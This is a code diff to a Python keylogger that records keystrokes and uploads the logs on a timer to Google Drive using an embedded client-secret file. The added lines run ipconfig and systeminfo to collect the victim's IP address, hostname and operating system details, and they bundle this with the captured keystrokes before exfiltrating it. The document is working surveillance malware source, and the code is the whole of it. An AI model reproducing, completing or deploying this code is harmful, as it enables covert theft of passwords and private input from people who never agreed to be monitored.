@@ -4,6 +4,12 @@ from threading import Timer #Ensures is to make a method run after an 'interval'
 from datetime import datetime #Mark files with datetime timestamp
 from Google import Create_Service
 from googleapiclient.http import MediaFileUpload
+import logging #For Logging INFOs, WARNINGs, ERRORs, CRITICALs, EXCEPTIONs, LOGs
+import subprocess #Retriving client info
+import regex as re #Sorting out client info
+
+#Initialising Logging Mod
+logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
 
 #Google Create_Service Content
 CLIENT_SECRET_FILE = 'client_file_keylogger_frost.json'
@@ -55,6 +61,7 @@ class keylogger:
     def report_to_file(self, mime_types, folder_id):
         
         with open(f'{self.filename}.txt', 'w') as f: #opens the file in write mode
+                print(self.client_info, file=f) #Writes Info about the Machine
                 print(self.log, file=f) #writes the keylogs to file
         print(f"[+] Saved {self.filename}.txt")
         
@@ -67,7 +74,7 @@ class keylogger:
             media = MediaFileUpload(f'{self.filename}.txt', resumable=True)
 
             service.files().create(body=file_metadata, media_body=media, fields="id").execute()
-            print(f"[+] Successfully Uploaded: {self.filename},txt")
+            logging.info(f"[*] INFO: %s : {self.filename}", "FILE SUCCESSFULLY UPLOADED")
 
     #invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
     def report(self):
@@ -85,12 +92,52 @@ class keylogger:
         timer.start() #Starts the timer
 
     def start(self):
+        client_info = self.retrieve_clientinfo()
+        logging.info(f"[*] INFO: %s : {self.client_info}", "KEY LOGGING SERVICE STARTED")
         self.start_dt = datetime.now() #Record start datetime
         keyboard.on_release(callback=self.callback) #Start the keylogger
         self.report() #Start reporting key strokes
-        print(f"{datetime.now()} - Started Keylogger") #Inidicator to indicate when keylogger has started
         keyboard.wait() #block the current thread, wait until Ctrl + C is pressed
 
+    def retrieve_clientinfo(self):
+        #Retrieve Client IP Address
+        result_ip = subprocess.Popen(("ipconfig"), stdout=subprocess.PIPE)
+        output_ip = subprocess.check_output(('find "IPv4 Address"'), stdin=result_ip.stdout)
+        output_ip = output_ip.decode("utf-8")
+
+        result_info = subprocess.run(("systeminfo"), capture_output=True)
+        output_info = result_info.stdout.decode("utf-8")
+
+        #Regex Splitting Strings
+        output_split = re.split(r":\s((\d{0,3}\S)+)", output_ip) #Client IP
+        output_split_info = re.split(r'\r\n+', output_info) #Sys Info
+        pattern1_info = re.compile(r'\s+') #Sys Info Pattern
+
+        ip_addr = []
+        sys_info = []
+        next_i = 1
+
+        #Client IP
+        for i in range(0, len(output_split)):
+            if (i == next_i):
+                ip_addr.append(output_split[i])
+                next_i = i + 3
+
+        #Sys Info
+        for i in range(0, len(output_split_info)):
+            if (("Host Name:" in output_split_info[i]) or ("OS Name:" in output_split_info[i]) or ("OS Version:" in output_split_info[i]) or ("System Type:" in output_split_info[i])):
+                output_space = re.sub(pattern1_info, ' ', output_split_info[i])
+                sys_info.append(output_space)
+
+        client_ip = ip_addr[-1]
+        hostname = sys_info[0]
+        os_name = sys_info[1]
+        os_version = sys_info[2]
+        system_type = sys_info[3]
+        bios_version = sys_info[4]
+
+        self.client_info = f"Client IP: {client_ip}, {hostname}, {os_name}, {os_version}, {system_type}, {bios_version}"
+        
 if __name__ == "__main__":
     keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="email") #Keylogger to send to email
     keylogger.start()
